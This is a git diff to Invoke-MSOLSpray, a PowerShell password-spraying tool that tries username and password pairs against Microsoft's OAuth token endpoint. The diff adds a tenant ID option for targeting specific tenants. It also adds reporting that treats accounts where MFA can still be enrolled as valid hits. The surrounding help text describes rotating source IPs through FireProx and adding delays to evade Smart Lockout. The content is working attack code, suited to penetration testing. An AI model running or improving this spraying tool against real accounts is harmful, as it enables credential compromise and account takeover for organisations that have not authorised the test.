@@ -34,6 +34,10 @@ function Invoke-MSOLSpray{
         
         The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
     
+    .PARAMETER TenantId
+        
+        The tenant ID to target. Default is "common". Useful for forcing authentication against a specific tenant (e.g., for B2B users).
+    
     .PARAMETER Delay
         
         Delay in seconds between each authentication attempt. Helps avoid rate limiting and Smart Lockout. Default is 0 seconds.
@@ -83,15 +87,20 @@ function Invoke-MSOLSpray{
     [string]
     $URL = "https://login.microsoft.com",
 
+    # Specify a target tenant ID (used to force authentication attempts against a specific tenant for B2B users)
     [Parameter(Position = 4, Mandatory = $False)]
+    [string]
+    $TenantId = "common",
+
+    [Parameter(Position = 5, Mandatory = $False)]
     [switch]
     $Force,
 
-    [Parameter(Position = 5, Mandatory = $False)]
+    [Parameter(Position = 6, Mandatory = $False)]
     [int]
     $Delay = 0,
 
-    [Parameter(Position = 6, Mandatory = $False)]
+    [Parameter(Position = 7, Mandatory = $False)]
     [switch]
     $VerboseErrors
   )
@@ -146,7 +155,7 @@ function Invoke-MSOLSpray{
         # Setting up the web request
         $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
         $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
-        $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 
+        $webrequest = Invoke-WebRequest $URL/$TenantId/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr
 
         # If we get a 200 response code it's a valid cred
         If ($webrequest.StatusCode -eq "200"){
@@ -162,6 +171,7 @@ function Invoke-MSOLSpray{
                 # Standard invalid password
             If($RespErr -match "AADSTS50126")
                 {
+                Write-Output "[*] INFO: Invalid password for $username."
                 continue
                 }
 
@@ -178,9 +188,16 @@ function Invoke-MSOLSpray{
                 }
 
                 # Microsoft MFA response
-            ElseIf(($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076"))
+            ElseIf($RespErr -match "AADSTS50076")
                 {
                 Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates MFA (Microsoft) is in use."
+                $fullresults += "$username : $password"
+                }
+            
+                # User can complete MFA registration
+            ElseIf($RespErr -match "AADSTS50079")
+                {
+                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates that MFA can be onboarded (password is valid)."
                 $fullresults += "$username : $password"
                 }
     
@@ -313,4 +330,5 @@ function Invoke-MSOLSpray{
         Write-Output "Results have been written to $OutFile."
         }
     }
+    Write-Host ""
 }
